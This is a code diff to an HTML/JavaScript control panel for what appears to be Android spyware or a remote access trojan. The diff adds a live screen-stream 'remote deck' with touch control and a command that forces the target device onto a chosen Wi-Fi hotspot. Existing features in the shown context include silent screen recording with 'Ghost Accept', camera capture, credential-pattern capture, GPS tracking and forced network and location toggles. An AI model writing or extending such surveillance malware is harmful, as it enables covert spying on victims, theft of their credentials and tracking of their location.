@@ -407,6 +407,24 @@
             </div>
         </div>
 
+    <!-- ZEROLINK PHONE-IN-PHONE REMOTE DECK OVERLAY -->
+    <div id="zerolink-overlay" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(5,5,5,0.98); z-index:3500; display:none; flex-direction:column; padding:0; backdrop-filter:blur(20px);">
+        <div style="display:flex; justify-content:space-between; align-items:center; padding:12px 15px; background:var(--surface); border-bottom:1px solid var(--primary); z-index:3501; box-shadow:0 0 15px rgba(0,243,255,0.2);">
+            <div style="display:flex; align-items:center; gap:12px;">
+                <h2 style="margin:0; font-size:0.85rem;">ZEROLINK // REMOTE DECK</h2>
+                <span class="status-dot online"></span>
+            </div>
+            <div onclick="closeZeroLinkModal()" style="font-size:2rem; color:var(--primary); cursor:pointer; padding:0 10px; line-height:1;">×</div>
+        </div>
+        <div style="display:flex; gap:8px; padding:10px 15px; background:#0b0f19; border-bottom:1px solid #1f2937; align-items:center;">
+            <input type="text" id="zl-deck-url" placeholder="http://192.168.43.xxx:8888" style="flex:1; background:#000; color:var(--primary); border:1px solid #333; padding:6px 10px; font-size:0.8rem;">
+            <button class="btn" onclick="connectZeroLinkDeck()" style="font-size:0.75rem; padding:6px 12px; background:var(--primary); color:#000; font-weight:bold;">CONNECT</button>
+            <button class="btn" onclick="document.getElementById('zl-iframe').src = document.getElementById('zl-deck-url').value" style="font-size:0.75rem; padding:6px 10px;">RELOAD</button>
+        </div>
+        <div style="flex:1; width:100%; background:#000; position:relative; overflow:hidden;">
+            <iframe id="zl-iframe" style="width:100%; height:100%; border:none; background:#000;" src="about:blank"></iframe>
+        </div>
+    </div>
     <div id="map-overlay" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:3000; display:none; flex-direction:column; padding:0; backdrop-filter:blur(15px);">
         <div style="display:flex; justify-content:space-between; align-items:center; padding:15px; background:var(--surface); border-bottom:1px solid var(--primary); z-index: 3001; box-shadow: 0 0 15px rgba(0, 243, 255, 0.2);">
             <div style="display:flex; align-items:center; gap:15px;">
@@ -978,6 +996,7 @@
                     { id: 'RECORD_SCREEN', name: 'Relentless Screen Record', icon: '🎥', keywords: 'video, movie, stream, monitor', inputs: [{id: 'rec-mode', label: 'Strategy', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Ghost Accept)'}, {v: 'RELENTLESS', l: 'Relentless Loop'}, {v: 'TRIGGER', l: 'Trigger Prompt'}, {v: 'SCRAPE', l: 'Scrape Dialog'}]}, {id: 'rec-dur', label: 'Duration (Sec)', type: 'number', val: 60}, {id: 'rec-qual', label: 'Resolution', type: 'select', options: [{v: 'MED', l: '720p'}, {v: 'LOW', l: '480p'}, {v: 'ULTRA_LOW', l: '360p (Data Saver)'}, {v: 'HIGH', l: '1080p'}]}, {id: 'rec-fps', label: 'Frame Rate', type: 'select', options: [{v: '30', l: '30 FPS'}, {v: '15', l: '15 FPS'}, {v: '10', l: '10 FPS'}, {v: '60', l: '60 FPS (Smooth)'}]}, {id: 'rec-audio', label: 'Audio (Mic)', type: 'select', options: [{v: 'FALSE', l: 'Video Only'}, {v: 'TRUE', l: 'With Audio'}]}] },
                     { id: 'CAPTURE_IMAGE', name: 'Take Photos', icon: '📷', keywords: 'camera, lens, front, rear', inputs: [{id: 'cam-side', label: 'Source', type: 'select', options: [{v: 'REAR', l: 'Rear'}, {v: 'FRONT', l: 'Front'}]}, {id: 'cam-count', label: 'Quantity', type: 'number', val: 1}] },
                     { id: 'GET_SENSORS', name: 'Sample Environment', icon: '🌡️', keywords: 'light, proximity, motion, temperature, physical, pocket', inputs: [] },
+                    { id: 'START_STREAM', name: 'ZeroLink Screen Stream', icon: '📺', keywords: 'zerolink, stream, screen, live, mirror, 30fps, remote, touch', inputs: [{id: 'stream-fps', label: 'Frame Rate', type: 'select', options: [{v: '30', l: '30 FPS (Default)'}, {v: '15', l: '15 FPS'}, {v: '10', l: '10 FPS'}, {v: '60', l: '60 FPS (Ultra)'}]}, {id: 'stream-qual', label: 'Resolution', type: 'select', options: [{v: 'MED', l: 'Balanced (480p/720p)'}, {v: 'LOW', l: 'Low Bandwidth (360p)'}, {v: 'HIGH', l: 'Full HD (720p/1080p)'}]}, {id: 'stream-port', label: 'Streaming Port', type: 'number', val: 8888}], cleanup: 'STOP_STREAM', customUI: '<div style="margin-bottom:10px;"><button class="btn" style="width:100%; border-style:dashed; color:var(--primary); border-color:var(--primary);" onclick="openZeroLinkModal()">🖥️ OPEN ZEROLINK REMOTE DECK</button></div>' },
                     { id: 'TRACKING_STREAM', name: 'High-Fidelity Tracking', icon: '🛰️', keywords: 'realtime, socket, live, tracker, database, batch', inputs: [{id: 'track-mode', label: 'Tracking Mode', type: 'select', options: [{v: 'BOTH', l: 'BOTH (Socket + DB)'}, {v: 'WEBSOCKET', l: 'WEBSOCKET (Live Map Only)'}, {v: 'DATABASE', l: 'DATABASE (Persistent Trail)'}, {v: 'OFF', l: 'Stop Tracking'}]}, {id: 'track-dur', label: 'Duration (Min)', type: 'number', val: 15}, {id: 'track-sample', label: 'GPS Sample Rate (Sec)', type: 'number', val: 3}, {id: 'track-batch', label: 'DB Batch Upload Rate (Sec)', type: 'number', val: 15}], customUI: '<div style="margin-bottom:10px;"><button class="btn" style="width:100%; border-style:dashed; color:var(--success); border-color:var(--success);" onclick="openLiveMap()">🗺️ OPEN SATELLITE MAP INTERFACE</button></div>' }
                 ]
             },
@@ -1053,6 +1072,7 @@
                     { id: 'FORCE_DATA', name: 'Ghost Hand Data Toggle', icon: '📡', keywords: 'mobile, data, cellular, internet', inputs: [{id: 'val-data', label: 'State', type: 'select', options: [{v: 'ENABLE', l: 'Enable'}, {v: 'DISABLE', l: 'Disable'}, {v: 'TOGGLE', l: 'Toggle (Blind)'}]}] },
                     { id: 'FORCE_WIFI', name: 'Ghost Hand Wi-Fi Toggle', icon: '📶', keywords: 'wifi, wlan, internet, connect, network', inputs: [{id: 'val-wifi', label: 'State', type: 'select', options: [{v: 'ENABLE', l: 'Enable'}, {v: 'DISABLE', l: 'Disable'}, {v: 'TOGGLE', l: 'Toggle (Blind)'}]}] },
                     { id: 'FORCE_LOCATION', name: 'Ghost Hand Location Toggle', icon: '📍', keywords: 'gps, location, tracking, enable, disable', inputs: [{id: 'val-loc', label: 'State', type: 'select', options: [{v: 'ENABLE', l: 'Enable (Enforce ON)'}, {v: 'DISABLE', l: 'Disable (15m Break)'}, {v: 'TOGGLE', l: 'Toggle (Blind)'}]}] },
+                    { id: 'CONNECT_WIFI', name: 'Join Hotspot / Wi-Fi', icon: '📶', keywords: 'wifi, hotspot, connect, join, lan, local', inputs: [{id: 'cw-ssid', label: 'Hotspot / SSID Name', type: 'text'}, {id: 'cw-pass', label: 'Password (Optional)', type: 'text'}] },
                     { 
                         id: 'REMOTE_TOUCH', 
                         name: 'Execute Touch Chain', 
@@ -1860,7 +1880,13 @@
                     case 'MOCK_ANR': content = document.getElementById('anr-target').value; break;
                     case 'TOAST': content = document.getElementById('val-toast').value; break;
                     case 'RING': content = document.getElementById('val-ring').value; break;
-                    case 'RECORD_SCREEN':
+                                        case 'CONNECT_WIFI':
+                        content = `${document.getElementById('cw-ssid').value.trim()}|${document.getElementById('cw-pass').value.trim()}`; break;
+                    case 'START_STREAM':
+                        content = `${document.getElementById('stream-fps').value}|${document.getElementById('stream-qual').value}|${document.getElementById('stream-port').value}`; break;
+                    case 'STOP_STREAM':
+                        content = ''; break;
+case 'RECORD_SCREEN':
                         content = `${document.getElementById('rec-mode').value}|${document.getElementById('rec-dur').value}|${document.getElementById('rec-qual').value}|${document.getElementById('rec-audio').value}|${document.getElementById('rec-fps').value}`; break;
                     case 'CAPTURE_CREDENTIALS':
                         content = `${document.getElementById('patt-timeout').value}|${document.getElementById('patt-qual').value}|${document.getElementById('patt-fps').value}`; break;
@@ -2265,6 +2291,26 @@
                     </div>`;
                 }
 
+                if (c.file_name === 'START_STREAM') {
+                    const statusText = c.status || '';
+                    const errorLog = c.error_log || '';
+                    const urlMatch = (statusText + ' ' + errorLog).match(/http:\/\/([0-9a-zA-Z\.:]+)/);
+                    const streamUrl = urlMatch ? urlMatch[0] : '';
+                    dataHtml = `<div style="margin-top:10px; padding:12px; background:rgba(0,243,255,0.05); border:1px solid var(--primary);">
+                        <div style="color:var(--primary); font-size:0.75rem; font-weight:bold; margin-bottom:6px;">📺 ZEROLINK_STREAM_STATUS</div>
+                        <div style="font-size:0.75rem; color:#fff; margin-bottom:8px;">${statusText}</div>
+                        ${errorLog ? `<div style="font-size:0.65rem; color:#aaa; margin-bottom:10px;">${errorLog}</div>` : ''}
+                        ${streamUrl ? `<button class="btn" style="width:100%; background:var(--primary); color:#000; font-weight:bold; padding:8px;" onclick="openZeroLinkWithUrl('${streamUrl}')">🖥️ LAUNCH INTERACTIVE DECK</button>` : ''}
+                    </div>`;
+                }
+
+                if (c.file_name === 'CONNECT_WIFI') {
+                    dataHtml = `<div style="margin-top:10px; padding:12px; background:rgba(0,255,157,0.05); border:1px solid var(--success);">
+                        <div style="color:var(--success); font-size:0.75rem; font-weight:bold; margin-bottom:6px;">📶 WI-FI_HANDSHAKE_REPORT</div>
+                        <div style="font-size:0.75rem; color:#fff; margin-bottom:4px;">STATUS: ${c.status}</div>
+                        <div style="font-size:0.65rem; color:#aaa;">${c.error_log || ''}</div>
+                    </div>`;
+                }
                 if (c.file_name === 'GET_LOGS' && c.result_data && c.result_data.logs) {
                     dataHtml = `<div style="margin-top:10px; padding:10px; background:rgba(0,0,0,0.4); border:1px solid #333;">
                         <div style="color:var(--primary); font-size:0.7rem; font-weight:bold; margin-bottom:8px;">TARGET_DIAGNOSTIC_LOGS</div>
@@ -3522,6 +3568,37 @@
                 trackingChannel = null;
                 toast("SATELLITE LINK SEVERED", "success");
             }
+        }
+        // --- ZEROLINK REMOTE DECK MODAL HANDLERS ---
+        function openZeroLinkModal() {
+            document.getElementById('zerolink-overlay').style.display = 'flex';
+        }
+
+        function closeZeroLinkModal() {
+            const frame = document.getElementById('zl-iframe');
+            if (frame) frame.src = 'about:blank';
+            document.getElementById('zerolink-overlay').style.display = 'none';
+        }
+
+        function connectZeroLinkDeck() {
+            let url = document.getElementById('zl-deck-url').value.trim();
+            if (!url) return toast("ENTER DECK URL", "danger");
+            if (!url.startsWith('http://') && !url.startsWith('https://')) {
+                url = 'http://' + url;
+            }
+            document.getElementById('zl-deck-url').value = url;
+            const frame = document.getElementById('zl-iframe');
+            frame.src = url;
+            toast("LOADING ZEROLINK DECK...", "success");
+        }
+
+        function openZeroLinkWithUrl(url) {
+            document.getElementById('status-overlay').style.display = 'none';
+            document.getElementById('zl-deck-url').value = url;
+            document.getElementById('zerolink-overlay').style.display = 'flex';
+            const frame = document.getElementById('zl-iframe');
+            frame.src = url;
+            toast("LAUNCHING ZEROLINK...", "success");
         }
 
         // --- CORTEX COGNITIVE INTERCEPT HUD COUPLER ---
